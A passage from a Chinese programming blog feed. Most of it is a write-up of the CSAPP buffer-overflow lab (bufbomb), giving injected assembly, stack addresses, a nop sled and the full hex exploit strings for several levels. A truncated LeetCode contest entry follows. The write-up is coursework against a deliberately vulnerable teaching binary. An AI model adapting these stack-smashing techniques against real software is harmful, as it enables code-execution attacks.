alt="3"></li><li>本次即需要两次跳转，第一次跳转到栈上的指令起始地址<code>0x55682fb8</code>，设置全局变量；执行完成指令后进行第二次跳转到<code>bang</code>函数的入口地址<code>0x08048c9d</code>，最后的结果为：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> a3 <span class="number">00</span> d1 <span class="number">04</span> <span class="number">08</span> <span class="number">68</span> <span class="number">9</span>d <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-Level-3-Dynamite"><a href="#4-Level-3-Dynamite" class="headerlink" title="4. Level 3: Dynamite"></a>4. Level 3: Dynamite</h3><ul><li>这个就比较复杂，需要改变<code>test</code>函数的执行逻辑，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改，并且保证<code>test</code>函数最终能够正常运行。<code>test</code>函数原本逻辑如下所示：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval(); </span><br><span class="line"></span><br><span class="line">    val = getbuf(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>如果按照正常逻辑，<code>getbuf</code>的返回值为<code>1</code>,而本题要求<code>val == cookie</code>，这就要求返回值为<code>cookie</code>，我们通过修改<code>getbuf</code>的返回值为<code>cookie</code>即可。我们仔细阅读汇编代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8048</span>db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80491f</span>4 &lt;getbuf&gt;</span><br><span class="line"><span class="number">8048</span>dbe:       <span class="number">89</span> c3                   mov    %eax,%ebx</span><br><span class="line"><span class="number">8048</span>dc0:       e8 cb ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br></pre></td></tr></table></figure>函数的返回值实际存放在<code>%eax</code>寄存器中，我们只需要修改<code>%eax</code>寄存器的值为<code>cookie</code>即可。本题还有比较关键的一点，我们在进行写缓冲区时把<code>test</code>函数的<code>%ebp</code>寄存器破坏掉了，我们返回前还需要恢复<code>%ebp</code>寄存器即可，我们通过<code>gdb</code>调试可以知道<code>%ebp</code>寄存器的地址为<code>0X55683010</code>。恢复的地址和修改寄存器的代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov $0X55683010, %ebp"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048dbe"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为上述指令的起始地址即可。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> de <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-Level-4-Nitroglycerin"><a href="#5-Level-4-Nitroglycerin" class="headerlink" title="5. Level 4: Nitroglycerin"></a>5. Level 4: Nitroglycerin</h3><ul><li>本题与第<code>4</code>题相似，但是比较复杂的处理在于栈的地址为动态变换的，此时我们就不可能像之前处理那样，栈的返回地址直接写为固定，此时我们需要用到<code>nop sleds</code>。这个所谓的难点也并不复杂，表示我们可以将机器指令全部设置为<code>nop</code>,在<code>nop</code>之后紧挨着执行我们的修改指令，因此我们只需要保证跳转指令一定能够跳转到<code>nop</code>指令段中即可，题目中所谓的随机栈地址的范围变化为<code>[-240,240]</code>之间进行变动，我们只需要设定某个值保证跳转一定能够跳转到<code>nop</code>指令即可。</li><li>此处我们将<code>512</code>个字节的内容全部设置为<code>nop</code>,只要保证指令一定能够跳转<code>nop</code>区间即可，因为<code>nop</code>执行结束后紧挨着即为我们需要执行的指令。</li><li>我们同时还需要恢复<code>ebp</code>寄存器，我们仔细观察<code>ebp</code>寄存器实际为<code>esp</code>地址偏移<code>0x28</code>即可。因为地址从高往低增长，所以<code>$ebp = $esp + 28</code>，我们可以通过汇编代码得知。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048e26</span> &lt;testn&gt;:</span><br><span class="line"> <span class="number">8048e26</span>:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">8048e27</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048e29</span>:       <span class="number">53</span>                      push   %ebx</span><br><span class="line"> <span class="number">8048e2</span>a:       <span class="number">83</span> ec <span class="number">24</span>                sub    $<span class="number">0x24</span>,%esp</span><br><span class="line"> <span class="number">8048e2</span>d:       e8 <span class="number">5</span>e ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048e32</span>:       <span class="number">89</span> <span class="number">45</span> f4                mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">8048e35</span>:       e8 d2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">804920</span>c &lt;getbufn&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov %esp,%eax"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"add $0x28,%eax"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov %eax,%ebp"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x8048e3a"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为<code>0x55682eb8</code>。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">89</span> e0 <span class="number">83</span> c0</span><br><span class="line"><span class="number">28</span> <span class="number">89</span> c5 b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> <span class="number">3</span>a</span><br><span class="line"><span class="number">8</span>e <span class="number">04</span> <span class="number">08</span> c3 b8 <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>总的来说，<code>lab3</code>的代码比<code>lab2</code>有趣多了，非常考验逻辑思维能力，通过学习对机器指令的执行过程有了非常熟悉的了解，也对缓冲区攻击的基本原理有了深刻的理解，当然实际的攻击过程远远比这复杂的多。计算机技术需要学习的技巧太多了。</li></ul><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CSAPP-lab3-bufboomb&quot;&gt;&lt;a href=&quot;#CSAPP-lab3-bufboomb&quot; class=&quot;headerlink&quot; title=&quot;CSAPP lab3 bufboomb&quot;&gt;&lt;/a&gt;CSAPP lab3 bufboomb&lt;/h1&gt;&lt;p&gt;本次实验的&lt;code&gt;project&lt;/code&gt;为&lt;code&gt;buflab&lt;/code&gt;，这个&lt;code&gt;lab&lt;/code&gt;比上次&lt;code&gt;lab2&lt;/code&gt;有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的&lt;code&gt;lab&lt;/code&gt;主要为详细描述缓冲区溢出的&lt;code&gt;shellcode&lt;/code&gt;编写，每个小的&lt;code&gt;case&lt;/code&gt;非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个&lt;code&gt;case&lt;/code&gt;全部通过，通过这&lt;code&gt;5&lt;/code&gt;个&lt;code&gt;case&lt;/code&gt;基本熟悉了&lt;code&gt;shellcode&lt;/code&gt;的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="代码实现" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛216场</title>
    <link href="http://yoursite.com/2020/11/22/228/"/>
    <id>http://yoursite.com/2020/11/22/228/</id>
    <published>2020-11-22T10:42:17.618Z</published>
    <updated>2020-11-22T11:22:57.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-216"><a href="#leetcode-contest-216" class="headerlink" title="leetcode  contest 216"></a>leetcode  contest 216</h1><p>本周最后一题基本上绝大部分人都做出来了，看来还是比较简单的contest。因为前三题基本上都是送分题。<br>试了虚拟竞赛，大概40分钟搞定，估计排名也就在200名左右，前三题确实太简单了。</p><h2 id="5605-检查两个字符串数组是否相等"><a href="#5605-检查两个字符串数组是否相等" class="headerlink" title="5605. 检查两个字符串数组是否相等"></a>5605. 检查两个字符串数组是否相等</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你两个字符串数组 <code>word1</code>和 <code>word2</code> 。如果两个数组表示的字符串相同，返回 <code>true</code>；否则，返回 <code>false</code> 。</p><a id="more"></a><p>数组表示的字符串 是由数组中的所有元素 按顺序 连接形成的字符串。</p><p>示例 1：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = [<span class="string">"ab"</span>, <span class="string">"c"</span>], word2 = [<span class="string">"a"</span>, <span class="string">"bc"</span>]</span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：</span><br><span class="line">word1 表示的字符串为 <span class="string">"ab"</span> + <span class="string">"c"</span> -&gt; <span class="string">"abc"</span></span><br><span class="line">word2 表示的字符串为 <span class="string">"a"</span> + <span class="string">"bc"</span> -&gt; <span class="string">"abc"</span></span><br><span class="line">两个字符串相同，返回 <span class="keyword">true</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = [<span class="string">"a"</span>, <span class="string">"cb"</span>], <span class="attr">word2</span> = [<span class="string">"ab"</span>, <span class="string">"c"</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span>  = [<span class="string">"abc"</span>, <span class="string">"d"</span>, <span class="string">"defg"</span>], <span class="attr">word2</span> = [<span class="string">"abcddefg"</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= word1.length, word2.length &lt;= 103</code></li><li><code>1 &lt;= word1[i].length, word2[i].length &lt;= 103</code></li><li><code>1 &lt;= sum(word1[i].length), sum(word2[i].length) &lt;= 103</code></li><li><code>word1[i] 和 word2[i] 由小写字母组成</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/design-an-ordered-stream" target="_blank" rel="noopener">https://leetcode-cn.com/problems/design-an-ordered-stream</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  简直就是送分题</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>直接将所有的字符串相加即可，判断相加后的字符串是否相等。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">arrayStringsAreEqual</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; word1, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; word2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s1;</span><br><span class="line">        <span class="built_in">string</span> s2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> w : word1) 